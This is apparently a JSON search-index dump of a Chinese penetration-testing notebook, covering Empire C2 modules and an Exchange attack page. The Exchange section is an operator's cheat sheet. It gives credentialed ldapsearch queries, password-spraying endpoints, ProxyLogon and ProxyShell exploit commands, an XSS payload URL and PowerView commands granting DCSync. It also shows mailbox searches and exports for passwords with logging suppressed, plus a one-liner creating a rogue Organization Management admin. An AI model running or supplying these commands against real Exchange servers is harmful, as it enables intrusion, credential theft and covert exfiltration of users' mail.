windows/teensy teensy\u6267\u884c\u6587\u4ef6 windows/wmic \u751f\u6210xsl \u5176\u5b9e\u8fd9\u91cc\u7684\u8f7d\u8377\u539f\u7406\u5927\u540c\u5c0f\u5f02\uff0c\u6838\u5fc3\u4ee3\u7801\u90fd\u662fmulti/launcher\u91cc\u7684\uff0c\u53ef\u4ee5\u9488\u5bf9\u6027\u505a\u514d\u6740","title":"\u9009\u62e9\u8f7d\u8377"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#agent","text":"interact\u8fdb\u5165agent \u57fa\u672c\u547d\u4ee4shell\u3001upload\u3001list\u3001info\u3002 \u5728interact\u79cd\uff0c\u6838\u5fc3\u662f\u6a21\u5757","title":"agent\u64cd\u4f5c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_execution","text":"\u5b57\u9762\u610f\u601d\uff0c\u4ee3\u7801\u6267\u884c\u3002 Assembly\u6307\u5b9a\u7a0b\u5e8f","title":"code_execution"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_executioninvoke_assembly","text":"\u4ece\u5185\u5b58\u6267\u884cdonet\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9b\u9632\u62a4","title":"code_execution/invoke_assembly"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_executioninvoke_dllinjection","text":"dll\u6ce8\u5165\uff0c\u4f7f\u7528\u7684PowerSploit\u91cc\u7684\u3002 ProcessID\u6307\u5b9a\u8981\u6ce8\u5165\u7684ID DLL\u6307\u5b9a\u8981\u6ce8\u5165\u7684dll","title":"code_execution/invoke_dllinjection"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_executioninvoke_metasploitpayload","text":"\u4f7f\u7528msf\u7684web_delivery\u6a21\u5757\u6ce8\u5165 URL\u6307\u5b9aweb_delivery\u7684URL","title":"code_execution/invoke_metasploitpayload"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_executioninvoke_ntsd","text":"\u4f7f\u7528NTSD\u6d3e\u751f\u4e00\u4e2aagent","title":"code_execution/invoke_ntsd"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_executioninvoke_reflectivepeinjection","text":"PowerSploit\u91cc\u7684\u53cd\u5c04\u578b\u6ce8\u5165\uff0c\u4f60\u95ee\u8fd9\u4e2a\u6ce8\u5165\u6709\u4ec0\u4e48\u4e0d\u4e00\u6837\u7684\u5730\u65b9\uff0c\u6211\u4e5f\u4e0d\u77e5\u9053\u3002","title":"code_execution/invoke_reflectivepeinjection"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_executioninvoke_shellcode","text":"\u8fd8\u662fPowerSploit\u91cc\u7684\u6a21\u5757\uff0c\u6267\u884cshellcode\u3002\u8981c#\u7684 Shellcode\u6307\u5b9ashellcode","title":"code_execution/invoke_shellcode"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#code_executioninvoke_shellcodemsil","text":"\u5728powershell\u79cd\u4e0d\u8c03\u7528win32 API\u6765\u6267\u884cshellcode\u7684\u65b9\u5f0f\uff0c\u5bf9shellcode\u8981\u6c42\u4e25\u683c \u8fd8\u662f\u522b\u7528\u8fd9\u4e2a\u4e86","title":"code_execution/invoke_shellcodemsil"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collection","text":"\u5b57\u9762\u610f\u601d\uff0c\u4fe1\u606f\u641c\u96c6","title":"collection"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionchromedump","text":"\u5c1d\u8bd5\u83b7\u53d6Chrome\u5bc6\u7801","title":"collection/ChromeDump"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionfoxdump","text":"","title":"collection/FoxDump"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionsharpchromium","text":"","title":"collection/SharpChromium"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionusbkeylogger","text":"\u770bUK\u7684\u65e5\u5fd7","title":"collection/USBKeylogger"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionwebcamrecorder","text":"\u6444\u50cf\u5934","title":"collection/WebcamRecorder"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionbrowser_data","text":"\u6d4f\u89c8\u5668\u6570\u636e","title":"collection/browser_data"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionclipboard_monitor","text":"\u7c98\u8d34\u677f\u76d1\u63a7","title":"collection/clipboard_monitor"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionfile_finder","text":"\u67e5\u627eIPC\u5171\u4eab\u6587\u4ef6","title":"collection/file_finder"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#find_interesting_file","text":"\u4e00\u6837","title":"find_interesting_file"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionget-winupdates","text":"\u83b7\u53d6\u66f4\u65b0\u5386\u53f2","title":"collection/get-winupdates"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionget_indexed_item","text":"","title":"collection/get_indexed_item"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionget_sql_column_sample_data","text":"","title":"collection/get_sql_column_sample_data"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#collectionget_sql_query","text":"\u540e\u9762\u4e0d\u5199\u4e86\u90fd\u662f\u83b7\u53d6\u5404\u79cd\u4fe1\u606f\u7684\u4e1c\u897f","title":"collection/get_sql_query"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#credentials","text":"\u83b7\u53d6\u51ed\u8bc1\u548ctoken\u7684","title":"credentials"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#exfiltration","text":"\u626b\u7aef\u53e3","title":"exfiltration"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#lateral_movement","text":"\u6a2a\u5411","title":"lateral_movement"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#management","text":"","title":"management"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#persistence","text":"\u6743\u9650\u7ef4\u6301\u7684","title":"persistence"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Empire%E7%AC%94%E8%AE%B0/#privesc","text":"\u63d0\u6743 recon situational_awareness trollsploit","title":"privesc"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Exchange%E6%94%BB%E5%87%BB%E9%9D%A2/","text":"title: Exchange\u653b\u51fb\u9762 date: 2021-11-09 10:13:20 \u5728\u5185\u7f51\u4e2d\u5b9a\u4f4dexchange ldapsearch \u8fc7\u6ee4\u6761\u4ef6\u53ef\u4ee5\u662f cn=Exchange Servers name=Exchange Servers sAMAccountName=Exchange Servers ldapsearch -x -h 192.168.0.66 -D \"test@klion.local\" -b \"DC=klion,DC=local\" -w \"Aa123456\" \"cn=Exchange Servers\" SPN\u67e5\u8be2 \u9700\u8981\u5728\u57df\u5185 setspn -Q IMAP/* \u7248\u672c\u8bc6\u522b \u6839\u636eF12\u4e2d\u7684\u5185\u90e8\u7248\u672c\u53f7\u6765\u67e5\u8be2\uff0c\u598215.2.986.9 https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019 \u53ef\u4e0a\u4f20shell\u7684\u8def\u5f84 | FileName | Path | | ------------ | ------------------------------------------------------------------------- | | zz.aspx | C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth | | zz.ashx | C:\\inetpub\\wwwroot\\aspnet_client | | zz.ashx | C:\\ProgramFiles\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth | \u679a\u4e3e\u7528\u6237 \u7206\u7834\u5bc6\u7801 \u5206\u5e38\u89c4\u7206\u7834\u548cNTLM\u9a8c\u8bc1\u7206\u7834\uff0c\u5bf9\u4e8e\u9650\u5236\u4e86\u767b\u5f55\u6b21\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5bf9NTLM\u9a8c\u8bc1\u7684\u63a5\u53e3\u8fdb\u884c\u7206\u7834\uff0c\u5e38\u7528\u63a5\u53e3\u5982\u4e0b /Autodiscover/Autodiscover.xml # \u81ea Exchange Server 2007 \u5f00\u59cb\u63a8\u51fa\u7684\u4e00\u9879\u81ea\u52a8\u670d\u52a1,\u7528\u4e8e\u81ea\u52a8\u914d\u7f6e\u7528\u6237\u5728Outlook\u4e2d\u90ae\u7bb1\u7684\u76f8\u5173\u8bbe\u7f6e,\u7b80\u5316\u7528\u6237\u767b\u5f55\u4f7f\u7528\u90ae\u7bb1\u7684\u6d41\u7a0b\u3002 /Microsoft-Server-ActiveSync/default.eas /Microsoft-Server-ActiveSync # \u7528\u4e8e\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u7535\u5b50\u90ae\u4ef6 /Autodiscover /Rpc/ # \u65e9\u671f\u7684 Outlook \u8fd8\u4f7f\u7528\u79f0\u4e3a Outlook Anywhere \u7684 RPC \u4ea4\u4e92 /EWS/Exchange.asmx /EWS/Services.wsdl /EWS/ # Exchange Web Service,\u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u4e4b\u95f4\u57fa\u4e8eHTTP\u7684SOAP\u4ea4\u4e92 /OAB/ # \u7528\u4e8e\u4e3aOutlook\u5ba2\u6237\u7aef\u63d0\u4f9b\u5730\u5740\u7c3f\u7684\u526f\u672c,\u51cf\u8f7b Exchange \u7684\u8d1f\u62c5 /owa # Exchange owa \u63a5\u53e3,\u7528\u4e8e\u901a\u8fc7web\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u90ae\u4ef6\u3001\u65e5\u5386\u3001\u4efb\u52a1\u548c\u8054\u7cfb\u4eba\u7b49 /ecp # Exchange \u7ba1\u7406\u4e2d\u5fc3,\u7ba1\u7406\u5458\u7528\u4e8e\u7ba1\u7406\u7ec4\u7ec7\u4e2d\u7684Exchange \u7684Web\u63a7\u5236\u53f0 /Mapi # Outlook\u8fde\u63a5 Exchange \u7684\u9ed8\u8ba4\u65b9\u5f0f,\u57282013\u548c2013\u4e4b\u540e\u5f00\u59cb\u4f7f\u7528,2010 sp2\u540c\u6837\u652f\u6301 /powershell # \u7528\u4e8e\u670d\u52a1\u5668\u7ba1\u7406\u7684 Exchange \u7ba1\u7406\u63a7\u5236\u53f0 burp\u7206\u7834OWA owa\u767b\u5f55\u53e3\u7206\u7834\uff0c\u7b80\u5355\u7c97\u66b4 autodiscover\u63a5\u53e3\u7206\u7834 \u5bf9NTLM\u9a8c\u8bc1\u7206\u7834\uff0cuser\u662f\u4ee5\u7528\u6237\u540d\u5f62\u5f0f https://github.com/sensepost/ruler EBurst\u6279\u91cf\u63a5\u53e3NTLM\u7206\u7834 https://github.com/grayddq/EBurst \u652f\u6301\u591a\u4e2a\u63a5\u53e3\u7206\u7834\uff0c\u5982\u679c\u8981\u6b63\u5e38\u4f7f\u7528\u8fd8\u9700\u8981\u4fee\u6539\u811a\u672c\u3002\u5173\u4e8eSSL\u8bc1\u4e66\u7684\u95ee\u9898\u3002 \u4f7f\u7528\u524d\u5148\u68c0\u6d4b\u63a5\u53e3\u53ef\u7528\u6027 CVE-2019-1040 \u9002\u7528\u5185\u7f51\uff0c\u4e2d\u7ee7\u653b\u51fb\u3002 https://github.com/Ridter/CVE-2019-1040 CVE-2020-0688-\u9700\u8981\u8ba4\u8bc1\u7684\u53cd\u5e8f\u5217\u5316RCE \u5bc6\u94a5\u786c\u7f16\u7801\u5bfc\u81f4\u7684\u53cd\u5e8f\u5217RCE\uff0c\u7b80\u5355\u7c97\u66b4\uff0c\u9700\u8981\u4e00\u4e2a\u7528\u6237 .\\ExchangeCmd.exe 192.168.0.16 test@klion.local Aa123456 CVE-2020-16875 \u53cd\u5e8f\u5217\u5316\uff0c\u811a\u672c\u76f4\u63a5\u5229\u7528\uff0c\u6267\u884c\u547d\u4ee4\uff0c\u9700\u8981\u4e00\u4e2a\u7528\u6237 https://srcincite.io/pocs/cve-2020-16875.py.txt CVE-2020-17144-Exchange2010 \u53ea\u80fd\u62532010\uff0cC#\u5de5\u5177\u5229\u7528\uff0c\u4fee\u6539ExploitClass.cs\u6765\u6307\u5b9ashell https://github.com/Airboi/CVE-2020-17144-EXP \u6216\u8005\u4f7f\u7528\u8fd9\u4e2a\u6765\u76f4\u63a5\u5199shell https://github.com/zcgonvh/CVE-2020-17144 ProxyLogon-\u7ec4\u5408RCE \u8fd9\u4e2apython3 https://github.com/p0wershe11/ProxyLogon \u8fd9\u4e2apython2 https://github.com/hausec/ProxyLogon CVE-2021-26855\uff08SSRF\uff09 \u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u7684SSRF\u6f0f\u6d1e\u5bfc\u81f4\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7\u3002 CVE-2021-27065\uff08\u4efb\u610f\u6587\u4ef6\u5199\u5165\uff09 \u9700\u8981\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e\u5bfc\u81f4RCE\u3002 ProxyOracle-\u6ca1\u591a\u5927\u7528 \u5229\u7528xss\u62ff\u5230cookie\u540e\u8fdb\u884cPadding Oracle\uff0c\u53ef\u80fd\u62ff\u5230\u8d26\u6237\u5bc6\u7801\uff1f CVE-2021-31195-\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\\&refurl=}}};alert(document.domain)// CVE-2021-31196-Padding Oracle ProxyShell-\u7ec4\u5408RCE CVE-2021-34473+CVE-2021-34523+CVE-2021-31207 RCE\u5229\u7528 \u6ce8\uff1a\u4efb\u610f\u6587\u4ef6\u5199\u5165\u7684\u5b9e\u73b0\u65b9\u5f0f\u5728\u4e00\u952e\u811a\u672c\u4e2d\u662f\u91c7\u53d6\u53d1\u9001\u4e00\u5c01\u90ae\u4ef6\u518d\u8fdb\u884c\u5bfc\u51fa\u90ae\u4ef6\u7684\u65b9\u5f0f 1\u3001\u4f7f\u7528WsMan\u534f\u8bae\u8c03\u7528exchange powershell\u63a5\u53e3\u7684New-MailboxExportRequest 2\u3001\u4f7f\u7528PST\u7f16\u7801\u5f02\u6216\u4e00\u6b21\u7684payload\uff0c\u4ee5\u4fbf\u8ba9\u90ae\u4ef6\u5bfc\u51fa\u65f6\u7684payload\u80fd\u591f\u5f97\u5230\u89e3\u7801 payload\u52a0\u5bc6\u5de5\u5177https://github.com/Ridter/proxyshell_payload 3\u3001\u7136\u540e\u4f7f\u7528\u5f97\u5230\u7684token\uff0c\u5c06\u52a0\u5bc6\u7684payload \u53d1\u9001\u6307\u5b9a\u63a5\u53e3 \u5148\u786e\u5b9a\u5b58\u5728\u7684\u90ae\u7bb1 python .\\exchange_ssrf_attacks.py --target 1.1.1.1 --action Get \u6216\u8005 python .\\proxyshell-enumerate.py -u https://1.1.1.1/ \u4e00\u952e\u5229\u7528 https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell_rce.py https://github.com/Udyz/proxyshell-auto/blob/main/proxyshell.py \u81ea\u52a8\u679a\u4e3e\u90ae\u7bb1 python .\\proxyshell.py -t 1.1.1.1 \u4e0a\u9762\u8fd9\u4e2a\u5de5\u5177\u53ef\u63a7\u5236\u5199\u5165\u7684payload\uff0c\u6307\u5b9apayload\u53c2\u6570\u6765\u63a7\u5236webshell\u7684\u5185\u5bb9 \u6307\u5b9a\u90ae\u7bb1 python .\\proxyshell_rce.py -u https://1.1.1.1 -e ac@exp.com \u4e0a\u9762\u8fd9\u4e2a\u5de5\u5177\u662f\u76f4\u63a5\u628a\u52a0\u5bc6\u597d\u7684payload\u5199\u8fdb\u53bb\u4e86\u3002 \u5982\u4e0b\u56feproxyshell.py\u5931\u8d25\u4e86\uff0c\u4f46proxyshell_rce.py\u6210\u529f\u4e86\u3002proxyshell_rce.py\u6548\u679c\u4f3c\u4e4e\u6bd4proxyshell.py\u66f4\u597d\u7528 \u6ca1\u6cd5RCE\u4f46\u5b58\u5728\u6f0f\u6d1e\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u529e\u6cd5 https://github.com/Jumbo-WJB/Exchange_SSRF \u679a\u4e3e\u90ae\u7bb1 python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Brute --file /tmp/emails.txt \u6307\u5b9a\u7528\u6237\u641c\u7d22\u8054\u7cfb\u4eba python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchC --email validuser@exchange.com --keyword test \u641c\u7d22\u90ae\u4ef6\u5e76\u4e0b\u8f7d python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchM --email userwantdown@exchange.com --keyword password \u4e0b\u8f7d\u6307\u5b9a\u90ae\u7bb1\u7684\u90ae\u4ef6 python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Download --email userwantdown@exchange.com CVE-2021-33768-\u6682\u65e0 Exchange\u540e\u6e17\u900f \u4eceexchange\u670d\u52a1\u4e0a\u83b7\u53d6\u90ae\u7bb1\u3001\u7528\u6237 powershell -exec bypass -command Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;Get-Mailbox | format-table Name,WindowsEmailAddress \u901a\u8fc7Exchange\u8fdb\u884cdcsync \u4f7f\u7528powerview\u4e3aexchange\u673a\u5668\u7528\u6237\u6dfb\u52a0dcsync\u6743\u9650 PS>Import-Module .\\powerview.ps1 PS>Add-DomainObjectAcl -TargetIdentity 'DC=test,DC=local' -PrincipalIdentity exchange2016$ -Rights DCSync -Verbose}\" \u5728Exchange\u670d\u52a1\u5668\u4e0a\u641c\u7d22\u90ae\u4ef6 \u5b9e\u73b0\u4ee3\u7801\u5df2\u4e0a\u4f20\u81f3github\uff0c\u5730\u5740\u5982\u4e0b\uff1a https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1 \u4ece\u7528\u6237test1\u4e2d\u641c\u7d22\u5305\u542b\u5355\u8bcdpass\u7684\u90ae\u4ef6\u5e76\u4fdd\u5b58\u5230\u7528\u6237test2\u7684out2\u6587\u4ef6\u5939\uff0c\u53c2\u6570\u5982\u4e0b\uff1a DirectSearchMailfromExchange -MailBox \"test1\" -Filter \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"out2\" -Version 2013 \u641c\u7d22\u6240\u6709\u5305\u542b\u5355\u8bcdpass\u7684\u90ae\u4ef6\u5e76\u4fdd\u5b58\u5230\u7528\u6237test2\u7684outAll\u6587\u4ef6\u5939\uff0c\u53c2\u6570\u5982\u4e0b\uff1a DirectSearchMailfromExchange -MailBox \"All\" -Filter \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"outAll\" -Version 2013 \u8865\u51451\uff1a\u641c\u7d22\u90ae\u4ef6\u7684\u5e38\u7528\u547d\u4ee4 (1)\u679a\u4e3e\u6240\u6709\u90ae\u7bb1\u7528\u6237\uff0c\u663e\u793a\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u7684\u6570\u91cf Get-Mailbox|Search-Mailbox -SearchQuery \"*pass*\" -EstimateResultOnly (2)\u641c\u7d22\u90ae\u7bb1\u7528\u6237test1\uff0c\u663e\u793a\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u7684\u6570\u91cf Search-Mailbox -Identity test1 -SearchQuery \"*pass*\" -EstimateResultOnly \u793a\u4f8b\u5982\u4e0b\u56fe\uff0c\u6570\u91cf\u4e3a4\u4e2a (3)\u679a\u4e3e\u6240\u6709\u90ae\u7bb1\u7528\u6237\uff0c\u5bfc\u51fa\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u81f3\u7528\u6237test2\u7684\u6587\u4ef6\u5939out\u4e2d(\u4e0d\u4fdd\u5b58\u65e5\u5fd7)\uff1a Get-Mailbox|Search-Mailbox -SearchQuery \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"out\" -LogLevel Suppress (4)\u641c\u7d22\u90ae\u7bb1\u7528\u6237test1\uff0c\u5bfc\u51fa\u5305\u542b\u5173\u952e\u8bcdpass\u7684\u90ae\u4ef6\u81f3\u7528\u6237test2\u7684\u6587\u4ef6\u5939out\u4e2d(\u4e0d\u4fdd\u5b58\u65e5\u5fd7)\uff1a Search-Mailbox -Identity test1 -SearchQuery \"*pass*\" -TargetMailbox \"test2\" -TargetFolder \"out\" -LogLevel Suppress \u5728Exchange\u670d\u52a1\u5668\u4e0a\u5bfc\u51fa\u90ae\u4ef6 \u7b2c\u4e00\u79cd\u65b9\u5f0f\u6d41\u7a0b\u5982\u4e0b\uff1a 1.\u4f7f\u7528PSSession\u8fde\u63a5\u5230Exchange\u670d\u52a1\u5668 2.\u5224\u65ad\u4f7f\u7528\u7684\u7528\u6237\u662f\u5426\u88ab\u52a0\u5165\u5230\u89d2\u8272\u7ec4\u201dMailbox Import Export\u201d \u5982\u679c\u672a\u88ab\u6dfb\u52a0\uff0c\u9700\u8981\u6dfb\u52a0\u7528\u6237 3.\u5bfc\u51fa\u90ae\u4ef6\u5e76\u4fdd\u5b58\u81f3Exchange\u670d\u52a1\u5668\u7684c:\\test\uff0c\u683c\u5f0f\u4e3apst\u6587\u4ef6 4.\u5982\u679c\u65b0\u6dfb\u52a0\u4e86\u7528\u6237\uff0c\u90a3\u4e48\u4f1a\u5c06\u7528\u6237\u79fb\u9664\u89d2\u8272\u7ec4\u201dMailbox Import Export\u201d 5.\u6e05\u9664PSSession \u5bfc\u51fa\u7684pst\u6587\u4ef6\u4f7f\u7528Outlook\u6253\u5f00\u5373\u53ef (1)\u5c06\u7528\u6237\u6dfb\u52a0\u5230\u89d2\u8272\u7ec4\u201dMailbox Import Export\u201d \u8fd9\u91cc\u4ee5\u7528\u6237administrator\u4e3a\u4f8b\uff1a New-ManagementRoleAssignment \u2013Role \"Mailbox Import Export\" \u2013User Administrator \u8865\u5145\uff1a\u79fb\u9664\u7684\u547d\u4ee4 Remove-ManagementRoleAssignment -Identity \"Mailbox Import Export-Administrator\" -Confirm:$false \u6dfb\u52a0\u540e\u518d\u6b21\u67e5\u770b\u8fdb\u884c\u786e\u8ba4\uff1a Get-ManagementRoleAssignment \u2013Role \"Mailbox Import Export\"|fl user (2)\u91cd\u65b0\u542f\u52a8Powershell \u5426\u5219\uff0c\u65e0\u6cd5\u4f7f\u7528\u547d\u4ee4New-MailboxexportRequest (3)\u5bfc\u51fa\u90ae\u4ef6\u5e76\u4fdd\u5b58 1.\u5bfc\u51fa\u6307\u5b9a\u7528\u6237\u7684\u6240\u6709\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test $User = \"test1\" New-MailboxexportRequest -mailbox $User -FilePath (\"\\\\localhost\\c$\\test\\\"+$User+\".pst\") 2.\u7b5b\u9009\u51fa\u6307\u5b9a\u7528\u6237\u7684body\u4e2d\u5305\u542b\u5355\u8bcdpass\u7684\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test $User = \"test1\" New-MailboxexportRequest -mailbox $User -ContentFilter {(body -like \"*pass*\")} -FilePath (\"\\\\localhost\\c$\\test\\\"+$User+\".pst\") 3.\u5bfc\u51fa\u6240\u6709\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath (\"\\\\localhost\\c$\\test\\\"+($_.name)+\".pst\")} \u7b2c\u4e8c\u79cd\u65b9\u5f0f \u6ce8\uff1a \u9700\u8981\u6307\u5b9aExchange\u7248\u672c \u6d41\u7a0b\u5982\u4e0b\uff1a 1.\u6dfb\u52a0\u7ba1\u7406\u5355\u5143 2.\u5bfc\u51fa\u90ae\u4ef6\u5e76\u4fdd\u5b58\u81f3Exchange\u670d\u52a1\u5668\u7684c:\\test\uff0c\u683c\u5f0f\u4e3apst\u6587\u4ef6 \u5bfc\u51fa\u7684pst\u6587\u4ef6\u4f7f\u7528Outlook\u6253\u5f00\u5373\u53ef (1)\u6dfb\u52a0\u7ba1\u7406\u5355\u5143 \u4e0d\u540cExchange\u7248\u672c\u5bf9\u5e94\u7684\u7ba1\u7406\u5355\u5143\u540d\u79f0\u4e0d\u540c\uff1a Exchange 2007: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin; Exchange 2010: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Exchange 2013 & 2016: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; \u4e0d\u9700\u8981\u8003\u8651\u89d2\u8272\u7ec4\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bfc\u51fa\u90ae\u4ef6 (2)\u5bfc\u51fa\u90ae\u4ef6 \u5bfc\u51fa\u7528\u6237test1\u7684\u90ae\u4ef6\uff0c\u4fdd\u5b58\u5230Exchange\u670d\u52a1\u5668\u7684c:\\test\uff1a Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; $User = \"test1\" New-MailboxexportRequest -mailbox $User -FilePath (\"\\\\localhost\\c$\\test\\\"+$User+\".pst\") \u547d\u4ee4\u884c\u4e0b\u6dfb\u52a0Exchange\u7ba1\u7406\u5458\u7528\u6237 powershell -c \"Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$pwd=convertto-securestring Password123 -asplaintext -force;New-Mailbox -UserPrincipalName testuser1@test.com -OrganizationalUnit test.com/Users -Alias testuser1 -Name testuser1 -DisplayName testuser1 -Password $pwd;Add-RoleGroupMember \\\"Organization Management\\\" -Member testuser1 -BypassSecurityGroupManagerCheck\" \u901a\u8baf\u5f55\u5bfc\u51fa burp\u5bfc\u51fa \u9700\u8981\u5bf9json\u683c\u5f0f\u8fdb\u884c\u5904\u7406\u4e00\u4e0b \u6570\u636e\u5305\uff0c\u4fee\u6539MaxEntriesReturned\u53c2\u6570\u6765\u5bfc\u51fa\u90ae\u7bb1\u6570\u91cf POST /owa/service.svc?action=FindPeople&ID=-25&AC=1 HTTP/1.1 Host: 192.168.0.16 Cookie: xxxx User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Action: FindPeople Content-Type: application/json; charset=utf-8 X-Owa-Canary: TbaZ2GpjckaBdewgr1Fzs6pk4PlEo9kIqjb4trHBtOg6bBXuxJYK2LUnStFgWPE33nzEigc2zMA. X-Owa-Clientbuildversion: 15.0.847.32 X-Owa-Actionname: BrowseInDirectory X-Owa-Attempt: 1 X-Owa-Actionid: -25 X-Owa-Correlationid: 8f354010-b00c-4ca4-a8bd-89c09d03aa0c_163643741326924 X-Owa-Clientbegin: 2021-11-09T05:56:53.269 Referer: https://192.168.0.16/owa/ Content-Length: 709 Dnt: 1 Connection: close {\"__type\":\"FindPeopleJsonRequest:#Exchange\",\"Header\":{\"__type\":\"JsonRequestHeaders:#Exchange\",\"RequestServerVersion\":\"Exchange2013\",\"TimeZoneContext\":{\"__type\":\"TimeZoneContext:#Exchange\",\"TimeZoneDefinition\":{\"__type\":\"TimeZoneDefinitionType:#Exchange\",\"Id\":\"SA Pacific Standard 